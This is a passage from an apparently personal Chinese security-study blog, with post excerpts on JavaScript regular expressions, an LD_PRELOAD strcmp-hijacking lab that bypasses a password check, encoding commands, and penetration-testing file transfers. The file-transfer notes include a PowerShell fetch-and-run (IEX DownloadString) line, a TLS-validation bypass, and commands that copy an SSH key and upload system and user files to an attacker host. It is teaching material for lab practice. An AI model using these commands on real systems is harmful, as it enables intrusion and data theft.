<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-unicode-hex.html">\uxxxx</a></td>
<td>查找以十六进制数 xxxx 规定的 Unicode 字符。</td>
</tr>
</tbody></table>
<h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><table>
<thead>
<tr>
<th>量词</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-onemore.html">n+</a></td>
<td>匹配任何包含至少一个 n 的字符串。例如，&#x2F;a+&#x2F; 匹配 “candy” 中的 “a”，”caaaaaaandy” 中所有的 “a”。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-zeromore.html">n*</a></td>
<td>匹配任何包含零个或多个 n 的字符串。例如，&#x2F;bo*&#x2F; 匹配 “A ghost booooed” 中的 “boooo”，”A bird warbled” 中的 “b”，但是不匹配 “A goat grunted”。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-zeroone.html">n?</a></td>
<td>匹配任何包含零个或一个 n 的字符串。例如，&#x2F;e?le?&#x2F; 匹配 “angel” 中的 “el”，”angle” 中的 “le”。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-nx.html">n{X}</a></td>
<td>匹配包含 X 个 n 的序列的字符串。例如，&#x2F;a{2}&#x2F; 不匹配 “candy,” 中的 “a”，但是匹配 “caandy,” 中的两个 “a”，且匹配 “caaandy.” 中的前两个 “a”。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-nxcomma.html">n{X,}</a></td>
<td>X 是一个正整数。前面的模式 n 连续出现至少 X 次时匹配。例如，&#x2F;a{2,}&#x2F; 不匹配 “candy” 中的 “a”，但是匹配 “caandy” 和 “caaaaaaandy.” 中所有的 “a”。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-nxy.html">n{X,Y}</a></td>
<td>X 和 Y 为正整数。前面的模式 n 连续出现至少 X 次，至多 Y 次时匹配。例如，&#x2F;a{1,3}&#x2F; 不匹配 “cndy”，匹配 “candy,” 中的 “a”，”caandy,” 中的两个 “a”，匹配 “caaaaaaandy” 中的前面三个 “a”。注意，当匹配 “caaaaaaandy” 时，即使原始字符串拥有更多的 “a”，匹配项也是 “aaa”。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-ndollar.html">n$</a></td>
<td>匹配任何结尾为 n 的字符串。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-ncaret.html">^n</a></td>
<td>匹配任何开头为 n 的字符串。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-nfollow.html">?&#x3D;n</a></td>
<td>匹配任何其后紧接指定字符串 n 的字符串。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-nfollow-not.html">?!n</a></td>
<td>匹配任何其后没有紧接指定字符串 n 的字符串。</td>
</tr>
</tbody></table>
<h2 id="RegExp-对象方法"><a href="#RegExp-对象方法" class="headerlink" title="RegExp 对象方法"></a>RegExp 对象方法</h2><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-compile.html">compile</a></td>
<td>在 1.5 版本中已废弃。 编译正则表达式。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-exec-regexp.html">exec</a></td>
<td>检索字符串中指定的值。返回找到的值，并确定其位置。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-test-regexp.html">test</a></td>
<td>检索字符串中指定的值。返回 true 或 false。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-tostring.html">toString</a></td>
<td>返回正则表达式的字符串。</td>
</tr>
</tbody></table>
<h2 id="支持正则表达式的-String-对象的方法"><a href="#支持正则表达式的-String-对象的方法" class="headerlink" title="支持正则表达式的 String 对象的方法"></a>支持正则表达式的 String 对象的方法</h2><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
<th>FF</th>
<th>IE</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/js/jsref-search.html">search</a></td>
<td>检索与正则表达式相匹配的值。</td>
<td>1</td>
<td>4</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/js/jsref-match.html">match</a></td>
<td>找到一个或多个正则表达式的匹配。</td>
<td>1</td>
<td>4</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/js/jsref-replace.html">replace</a></td>
<td>替换与正则表达式匹配的子串。</td>
<td>1</td>
<td>4</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/js/jsref-split.html">split</a></td>
<td>把字符串分割为字符串数组。</td>
<td>1</td>
<td>4</td>
</tr>
</tbody></table>
<hr>
<h2 id="RegExp-对象属性"><a href="#RegExp-对象属性" class="headerlink" title="RegExp 对象属性"></a>RegExp 对象属性</h2><table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-constructor.html">constructor</a></td>
<td>返回一个函数，该函数是一个创建 RegExp 对象的原型。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-global.html">global</a></td>
<td>判断是否设置了 “g” 修饰符</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-ignorecase.html">ignoreCase</a></td>
<td>判断是否设置了 “i” 修饰符</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-lastindex-regexp.html">lastIndex</a></td>
<td>用于规定下次匹配的起始位置</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-multiline-regexp.html">multiline</a></td>
<td>判断是否设置了 “m” 修饰符</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-source-regexp.html">source</a></td>
<td>返回正则表达式的匹配模式</td>
</tr>
</tbody></table>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/others" style=color:#00a596>
                others
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/Regular_operations/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/Function_hijacking_experiments/">
        <h2>
            函数劫持实验
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h2 id="函数劫持实验"><a href="#函数劫持实验" class="headerlink" title="函数劫持实验"></a>函数劫持实验</h2><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><h4 id="Linux-编译动态链接库（-so）"><a href="#Linux-编译动态链接库（-so）" class="headerlink" title="Linux 编译动态链接库（.so）"></a>Linux 编译动态链接库（.so）</h4><p>参考文章：</p>
<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/chengyq116/article/details/100567555?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167143895816782425647499%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=167143895816782425647499&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-2-100567555-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=gcc%20-shared%20-fpic%20-o&spm=1018.2226.3001.4187">GCC 生成动态链接库 .so 文件 (-shared 和 -fPIC 选项)</a></p>
<p><strong>gcc -shared -fpic</strong></p>
<blockquote>
<p><code>-fPIC</code> 选项作用于编译阶段，告诉编译器产生与位置无关代码 (Position-Independent Code),这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。</p>
</blockquote>
<blockquote>
<p>如果想创建一个动态链接库，可以使用 GCC 的 -shared 选项。输入文件可以是源文件、汇编文件或者目标文件。</p>
</blockquote>
<p>一般的编译链接命令行为：</p>
<p><code>gcc -fPIC -shared func.c -o libfunc.so</code></p>
<h4 id="readelf-lt-option-s-gt-elf-file-s"><a href="#readelf-lt-option-s-gt-elf-file-s" class="headerlink" title="readelf  &lt;option(s)&gt;  elf-file(s)"></a>readelf  &lt;option(s)&gt;  elf-file(s)</h4><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/tanrui519521/article/details/79868700?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167143780216800182759984%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167143780216800182759984&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-79868700-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=readelf&spm=1018.2226.3001.4187">Linux中的readelf命令</a></p>
<blockquote>
<p>关于ELF文件：</p>
<p>ELF文件类型：</p>
<p>a)可重定位文件:用户和其他目标文件一起创建可执行文件或者共享目标文件,例如lib*.a文件。</p>
<p>b)可执行文件：用于生成进程映像，载入内存执行,例如编译好的可执行文件a.out。</p>
<p>c)共享目标文件：用于和其他共享目标文件或者可重定位文件一起生成elf目标文件或者和执行文件一起创建进程映像，例如lib*.so文件。</p>
<p>ELF文件作用：</p>
<p>ELF文件参与程序的连接(建立一个程序)和程序的执行(运行一个程序)，所以可以从不同的角度来看待elf格式的文件：</p>
<p>a)如果用于编译和链接（可重定位文件），则编译器和链接器将把elf文件看作是节头表描述的节的集合,程序头表可选。</p>
<p>b)如果用于加载执行（可执行文件），则加载器则将把elf文件看作是程序头表描述的段的集合，一个段可能包含多个节，节头表可选。</p>
<p>c)如果是共享文件，则两者都含有。</p>
<p>ELF文件总体组成：</p>
<p>elf文件头描述elf文件的总体信息。包括： 系统相关，类型相关，加载相关，链接相关。</p>
</blockquote>
<p>-s –syms              Display the symbol table</p>
<p>-W –wide              Allow output width to exceed 80 characters</p>
<p>通过此命令可以查看动态库中包含的函数或者函数都调用了哪些库函数</p>
<p>###实验</p>
<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html">参考</a></p>
<p>先编写一个c语言文件cp.c:</p>
<blockquote>
<pre><code>#!c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int main(int argc, char **argv)&#123;
char passwd[] = &quot;password&quot;;
if (argc &lt; 2) &#123;
        printf(&quot;usage: %s &lt;password&gt;/n&quot;, argv[0]);
        return;
&#125;
if (!strcmp(passwd, argv[1])) &#123;
        printf(&quot;Correct Password!/n&quot;);
        return;
&#125;
printf(&quot;Invalid Password!/n&quot;);
&#125;
</code></pre>
</blockquote>
<p>其中用到了<code>strcmp（）</code>函数</p>
<p>我们尝试劫持<code>strcmp()</code>函数</p>
<p>先构造一个新的<code>strcmp()</code>函数：</p>
<p>hack.c</p>
<blockquote>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int strcmp(const char *s1, const char *s2)&#123;
    printf(&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;, s1, s2);
    return 0;
&#125;
</code></pre>
</blockquote>
<p>我们将hack.c编译成动态链接库</p>
<p><code>gcc -shared hack.c -o hack.so</code></p>
<p>再设置LD_PRELOAD</p>
<p><code>export LD_PRELOAD=&quot;./hack.so&quot;</code></p>
<p>当我们再执行<code>srtcmp()</code>函数时，得到</p>
<blockquote>
<p>hack function invoked. ……</p>
</blockquote>
<p>此时函数劫持成功</p>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3>
            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/靶场学习" style=color:#ffa2c4>
                靶场学习
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/Function_hijacking_experiments/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/encode/">
        <h2>
            encode
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h4 id="Base64-Encode"><a href="#Base64-Encode" class="headerlink" title="Base64 Encode"></a>Base64 Encode</h4><p>To encode any text into <code>base64</code> in Linux, we can echo it and pipe it with ‘<code>|</code>‘ to <code>base64</code>:</p>
<p>  Base64 Encode</p>
<pre><code>Tanin@htb[/htb]$ echo https://www.hackthebox.eu/ | base64

aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K
</code></pre>
<h4 id="Base64-Decode"><a href="#Base64-Decode" class="headerlink" title="Base64 Decode"></a>Base64 Decode</h4><p>If we want to decode any <code>base64</code> encoded string, we can use <code>base64 -d</code>, as follows:</p>
<p>  Base64 Decode</p>
<pre><code>Tanin@htb[/htb]$ echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d

https://www.hackthebox.eu/
</code></pre>
<h4 id="Hex-Encode"><a href="#Hex-Encode" class="headerlink" title="Hex Encode"></a>Hex Encode</h4><p>To encode any string into <code>hex</code> in Linux, we can use the <code>xxd -p</code> command:</p>
<p>  Hex Encode</p>
<pre><code>Tanin@htb[/htb]$ echo https://www.hackthebox.eu/ | xxd -p

68747470733a2f2f7777772e6861636b746865626f782e65752f0a
</code></pre>
<h4 id="Hex-Decode"><a href="#Hex-Decode" class="headerlink" title="Hex Decode"></a>Hex Decode</h4><p>To decode a <code>hex</code> encoded string, we can use the <code>xxd -p -r</code> command:</p>
<p>  Hex Decode</p>
<pre><code>Tanin@htb[/htb]$ echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r

https://www.hackthebox.eu/
</code></pre>
<p>在命令行中，<code>xxd -p -r</code> 是一个常见的命令，用于进行十六进制转换和恢复。</p>
<ul>
<li><code>p</code> 代表 “plain”，表示以纯文本（plain text）形式进行转换。在这种情况下，<code>xxd</code> 命令将会以十六进制表示的字节流转换为对应的纯文本数据。</li>
<li><code>r</code> 代表 “reverse”，表示进行逆向操作，即从十六进制数据恢复为原始的二进制数据。</li>
</ul>
<p>因此，<code>xxd -p -r</code> 的完整含义是将以十六进制表示的字节流转换为对应的纯文本数据，或将十六进制数据恢复为原始的二进制数据。</p>
<p><code>xxd</code> 是一个实用工具，用于在命令行中进行十六进制转换和操作。它的全称是 “hexdump”，表示以十六进制形式进行转储（hexadecimal dump）。它可以用于查看、创建和修改二进制文件的十六进制表示形式。</p>
<h4 id="Rot13-Encode"><a href="#Rot13-Encode" class="headerlink" title="Rot13 Encode"></a>Rot13 Encode</h4><p>There isn’t a specific command in Linux to do <code>rot13</code> encoding. However, it is fairly easy to create our own command to do the character shifting:</p>
<p>  Rot13 Encode</p>
<pre><code>Tanin@htb[/htb]$ echo https://www.hackthebox.eu/ | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;

uggcf://jjj.unpxgurobk.rh/
</code></pre>
<h4 id="Rot13-Decode"><a href="#Rot13-Decode" class="headerlink" title="Rot13 Decode"></a>Rot13 Decode</h4><p>We can use the same previous command to decode rot13 as well:</p>
<p>  Rot13 Decode</p>
<pre><code>Tanin@htb[/htb]$ echo uggcf://jjj.unpxgurobk.rh/ | tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;

https://www.hackthebox.eu/
</code></pre>
<ul>
<li><code>echo https://www.hackthebox.eu/</code>：输出字符串 “<a target="_blank" rel="noopener" href="https://www.hackthebox.eu/">https://www.hackthebox.eu/</a>“</li>
<li><code>tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;</code>：使用 <code>tr</code> 命令进行字符替换。该命令将字母进行凯撒密码的置换，将字母 A-Z 和 a-z 分别替换为 N-ZA-M 和 n-za-m。</li>
</ul>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/base" style=color:#00bcd4>
                base
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/encode/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/FILE TRANSFERS/">
        <h2>
            FILE TRANSFERS
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h1 id="FILE-TRANSFERS"><a href="#FILE-TRANSFERS" class="headerlink" title="FILE TRANSFERS"></a>FILE TRANSFERS</h1><p>##WINDOWS</p>
<p>PowerShell Base64编码和解码<br>根据我们想要传输的文件大小，我们可以使用不需要网络通信的不同方法。如果我们可以访问终端，我们可以将文件编码为base64字符串，从终端复制其内容并执行反向操作，解码原始内容中的文件。让我们看看如何使用PowerShell实现这一点。<br>使用此方法的一个重要步骤是确保编码和解码的文件是正确的。我们可以使用md5sum，一个计算和验证128位MD5校验和的程序。MD5散列的作用是文件的紧凑数字指纹，这意味着一个文件在任何地方都应该有相同的MD5散列。让我们尝试传输一个示例ssh密钥。它可以是其他任何东西，从我们的Pwnbox到Windows目标。</p>
<pre><code>Tanin@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
</code></pre>
<pre><code>cat id_rsa |base64 -w 0;echo
</code></pre>
<p><code>base64 -w 0</code>：这个部分使用<code>base64</code>命令将前一个命令的输出进行Base64编码。<code>-w 0</code>选项表示输出结果不进行换行，而是将整个编码结果放在一行中。</p>
<p>我们可以复制此内容并将其粘贴到Windows PowerShell终端中，然后使用一些PowerShell函数对其进行解码。</p>
<pre><code>PS C:\htb&gt; [IO.File]::WriteAllBytes(&quot;C:\Users\Public\id_rsa&quot;, [Convert]::FromBase64String(&quot;$&#123;md5_string&#125;&quot;))
</code></pre>
<p>###PowerShell Web下载</p>
<p>大多数公司都允许HTTP和HTTPS出站流量通过防火墙，以提高员工的工作效率。利用这些传输方法进行文件传输操作非常方便。尽管如此，维权者可以使用网络过滤解决方案来阻止访问特定的网站类别，阻止下载文件类型（如.exe），或者只允许访问更受限制的网络中的白名单域列表。<br>PowerShell提供了许多文件传输选项。在任何版本的PowerShell中，System.Net.WebClient类都可以用于通过HTTP、HTTPS或FTP下载文件。下表介绍了从资源下载数据的WebClient方法：</p>
<table>
<thead>
<tr>
<th><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0">OpenRead</a></th>
<th>Returns the data from a resource as a <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0">Stream</a>.</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0">OpenReadAsync</a></td>
<td>Returns the data from a resource without blocking the calling thread.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0">DownloadData</a></td>
<td>Downloads data from a resource and returns a Byte array.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0">DownloadDataAsync</a></td>
<td>Downloads data from a resource and returns a Byte array without blocking the calling thread.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0">DownloadFile</a></td>
<td>Downloads data from a resource to a local file.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0">DownloadFileAsync</a></td>
<td>Downloads data from a resource to a local file without blocking the calling thread.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">DownloadString</a></td>
<td>Downloads a String from a resource and returns a String.</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0">DownloadStringAsync</a></td>
<td>Downloads a String from a resource without blocking the calling thread.</td>
</tr>
</tbody></table>
<p>PowerShell调用Web请求<br>从PowerShell 3.0起，Invoke-WebRequest cmdlet也可用，但下载文件的速度明显较慢。您可以使用别名<strong>iwr、curl和wget</strong>，而不是InvokeWebRequest的全名。</p>
<p>###PowerShell的常见错误</p>
<p>在某些情况下，Internet Explorer首次启动配置可能尚未完成，从而阻止下载。这可以使用参数-UseBasicParsing绕过。</p>
<p>如果证书不受信任，PowerShell下载中的另一个错误与SSL&#x2F;TLS安全通道有关。我们可以使用以下命令绕过该错误：</p>
<pre><code>PS C:\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = &#123;$true&#125;
</code></pre>
<p>###SMB Downloads</p>
<p>The Server Message Block protocol (SMB protocol) that runs on port TCP&#x2F;445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.</p>
<p>We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver.py</a> from Impacket and then use <code>copy</code>, <code>move</code>, PowerShell <code>Copy-Item</code>, or any other tool that allows connection to SMB.</p>
<pre><code>Tanin@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
</code></pre>
<h3 id="Create-the-SMB-Server"><a href="#Create-the-SMB-Server" class="headerlink" title="Create the SMB Server"></a>Create the SMB Server</h3><p>新版本的Windows阻止未经身份验证的访客访问，正如我们在以下命令中看到的：</p>
<pre><code>C:\htb&gt; copy \\192.168.220.133\share\nc.exe

You can&#39;t access this shared folder because your organization&#39;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
</code></pre>
<p>要在这种情况下传输文件，我们可以使用Impacket SMB服务器设置用户名和密码，并在windows目标计算机上装载SMB服务器：</p>
<pre><code> sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
</code></pre>
<p>使用用户名和密码装载SMB服务器</p>
<pre><code>C:\htb&gt; net use n: \\192.168.220.133\share /user:test test

The command completed successfully.
</code></pre>
<p>###FTP下载</p>
<p>另一种传输文件的方法是使用FTP（文件传输协议），它使用端口TCP&#x2F;21和TCP&#x2F;20。我们可以使用FTP客户端或PowerShell Net.WebClient从FTP服务器下载文件。<br>我们可以使用Python3-pyftpdlib模块在攻击主机中配置FTP服务器。可以使用以下命令进行安装：</p>
<pre><code>sudo pip3 install pyftpdlib
</code></pre>
<p>然后我们可以指定端口号21，因为在默认情况下，pyftpdlib使用端口2121。如果我们没有设置用户和密码，则默认情况下会启用匿名身份验证。</p>
<p>设置Python3 FTP服务器</p>
<pre><code> sudo python3 -m pyftpdlib --port 21
</code></pre>
<p>使用PowerShell从FTP服务器传输文件</p>
<pre><code>PS C:\htb&gt; (New-Object Net.WebClient).DownloadFile(&#39;ftp://192.168.49.128/file.txt&#39;, &#39;ftp-file.txt&#39;)
</code></pre>
<p>当我们在远程机器上获得shell时，我们可能没有交互式shell。如果是这种情况，我们可以创建一个FTP命令文件来下载一个文件。首先，我们需要创建一个包含要执行的命令的文件，然后使用FTP客户端使用该文件下载该文件。</p>
<p>为FTP客户端创建命令文件并下载目标文件</p>
<pre><code>C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
C:\htb&gt; echo binary &gt;&gt; ftpcommand.txt
C:\htb&gt; echo GET file.txt &gt;&gt; ftpcommand.txt
C:\htb&gt; echo bye &gt;&gt; ftpcommand.txt
C:\htb&gt; ftp -v -n -s:ftpcommand.txt
ftp&gt; open 192.168.49.128
Log in with USER and PASS first.
ftp&gt; USER anonymous

ftp&gt; GET file.txt
ftp&gt; bye

C:\htb&gt;more file.txt
This is a test file
</code></pre>
<h3 id="PowerShell-Web-Uploads"><a href="#PowerShell-Web-Uploads" class="headerlink" title="PowerShell Web Uploads"></a>PowerShell Web Uploads</h3><p>PowerShell没有用于上载操作的内置函数，但我们可以使用Invoke-WebRequest或Invoke-RestMethod来构建上载函数。我们还需要一个接受上传的web服务器，这不是大多数常见web服务器实用程序中的默认选项。<br>对于我们的web服务器，我们可以使用uploadserver，这是Python HTTP.server模块的扩展模块，其中包括一个文件上传页面。让我们安装它并启动Web服务器。</p>
<pre><code>pip3 install uploadserver
</code></pre>
<pre><code>python3 -m uploadserver
</code></pre>
<p>现在，我们可以使用PowerShell脚本PSUpload.ps1，该脚本使用Invoke-WebRequest来执行上载操作。该脚本接受两个参数-File和-Uri，前者用于指定文件路径，后者用于上传文件的服务器URL。让我们尝试从Windows主机上传主机文件。</p>
<p>将文件上载到Python上载服务器的PowerShell脚本</p>
<pre><code>PS C:\htb&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;)
PS C:\htb&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
</code></pre>
<p>###SMB上载</p>
<p>我们之前讨论过，公司通常允许使用HTTP（TCP&#x2F;80）和HTTPS（TCP&#x2F;443）协议进行出站流量。通常，企业不允许SMB协议（TCP&#x2F;445）离开其内部网络，因为这会使他们面临潜在的攻击。有关此方面的更多信息，我们可以阅读Microsoft的文章“防止SMB流量从横向连接进入或离开网络”。<br>另一种选择是使用WebDav通过HTTP运行SMB。WebDAV（RFC 4918）是HTTP的扩展，HTTP是网络浏览器和网络服务器用来相互通信的互联网协议。WebDAV协议使Web服务器能够像文件服务器一样运行，支持协作内容创作。WebDAV也可以使用HTTPS。<br>当您使用SMB时，它将首先尝试使用SMB协议进行连接，如果没有可用的SMB共享，它将尝试使用HTTP进行连接。在下面的Wireshark捕获中，我们尝试连接到文件共享测试3，因为它没有发现任何SMB，所以它使用HTTP。</p>
<p>配置WebDav服务器<br>要设置我们的WebDav服务器，我们需要安装两个Python模块，wsgidav和cheroot（您可以在这里阅读更多关于此实现的信息：wsgidav-github）。安装它们之后，我们在目标目录中运行wsgidav应用程序。<br>安装WebDav Python模块</p>
<pre><code> sudo pip install wsgidav cheroot
</code></pre>
<pre><code>sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
</code></pre>
<p>现在我们可以尝试使用DavWWWRoot目录连接到共享。</p>
<pre><code>C:\htb&gt; dir \\192.168.49.128\DavWWWRoot
</code></pre>
<p>注意：DavWWWRoot是一个由Windows Shell识别的特殊关键字。您的WebDAV服务器上不存在这样的文件夹。DavWWWRoot关键字告诉Mini-Redirector驱动程序，该驱动程序处理您正在连接到WebDAV服务器根目录的WebDAV请求。<br>如果在连接到服务器时指定了服务器上存在的文件夹，则可以避免使用此关键字。例如：\192.168.49.128\sharefolder</p>
<p>使用SMB上载文件</p>
<pre><code>C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb&gt; copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
</code></pre>
<p>注意：如果没有SMB（TCP&#x2F;445）限制，您可以使用impacket-smbserver，方法与我们为下载操作设置的方法相同。</p>
<p>###FTP Uploads</p>
<p>使用FTP上传文件与下载文件非常相似。我们可以使用PowerShell或FTP客户端来完成操作。在使用Python模块pyftpdlib启动FTP服务器之前，我们需要指定选项–write，以允许客户端将文件上传到我们的攻击主机。</p>
<pre><code>sudo python3 -m pyftpdlib --port 21 --write
</code></pre>
<p>现在，让我们使用PowerShell上载功能将文件上载到FTP服务器。</p>
<p>现在，让我们使用PowerShell上载功能将文件上载到FTP服务器。</p>
<p>PowerShell上载文件</p>
<pre><code>PS C:\htb&gt; (New-Object Net.WebClient).UploadFile(&#39;ftp://192.168.49.128/ftp-hosts&#39;, &#39;C:\Windows\System32\drivers\etc\hosts&#39;)
</code></pre>
<p>为FTP客户端创建用于上载文件的命令文件</p>
<pre><code>C:\htb&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
C:\htb&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
